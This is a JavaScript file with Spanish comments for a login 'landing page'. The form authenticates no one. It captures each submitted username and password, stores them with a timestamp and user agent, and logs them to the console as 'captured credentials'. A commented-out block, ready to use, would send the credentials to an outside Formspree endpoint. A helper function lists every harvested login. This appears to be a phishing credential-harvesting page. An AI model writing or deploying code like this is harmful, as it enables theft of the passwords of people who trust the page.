// script.js - Versión mejorada
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            // Validación básica
            if (!username || !password) {
                messageDiv.innerHTML = 'Por favor completa todos los campos';
                messageDiv.style.color = 'red';
                return;
            }
            
            // Mostrar mensaje de carga
            messageDiv.innerHTML = 'Procesando...';
            messageDiv.style.color = 'blue';
            
            // Opción 1: Guardar en localStorage (solo para pruebas locales)
            const loginData = {
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };
            
            // Guardar en localStorage (solo visible para ti)
            let savedLogins = JSON.parse(localStorage.getItem('logins') || '[]');
            savedLogins.push(loginData);
            localStorage.setItem('logins', JSON.stringify(savedLogins));
            
            // Opción 2: Enviar a un servicio de forms (más útil)
            // Descomenta estas líneas si quieres usar Formspree
            /*
            try {
                const response = await fetch('https://formspree.io/f/tu-endpoint-aqui', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        page: 'Login Page',
                        timestamp: new Date().toISOString()
                    })
                });
                
                if (response.ok) {
                    messageDiv.innerHTML = '¡Datos enviados correctamente!';
                    messageDiv.style.color = 'green';
                } else {
                    throw new Error('Error en el envío');
                }
            } catch (error) {
                messageDiv.innerHTML = 'Error al enviar. Datos guardados localmente.';
                messageDiv.style.color = 'orange';
                console.error('Error:', error);
            }
            */
            
            // Por ahora, solo mostraremos los datos en consola
            console.log('✅ Credenciales capturadas:', loginData);
            console.log('📊 Todos los logins guardados:', JSON.parse(localStorage.getItem('logins')));
            
            // Feedback visual
            messageDiv.innerHTML = '✅ Datos guardados localmente. Revisa la consola (F12)';
            messageDiv.style.color = 'green';
            
            // Limpiar formulario después de 3 segundos
            setTimeout(() => {
                loginForm.reset();
                setTimeout(() => {
                    messageDiv.innerHTML = '';
                }, 2000);
            }, 3000);
        });
    }
    
    // Función para ver los datos guardados (presiona F12 y escribe verLogins() en la consola)
    window.verLogins = function() {
        const logins = JSON.parse(localStorage.getItem('logins') || '[]');
        console.table(logins);
        return logins;
    };
    
    console.log('🚀 Landing page cargada. Usa verLogins() en consola para ver datos guardados');
});
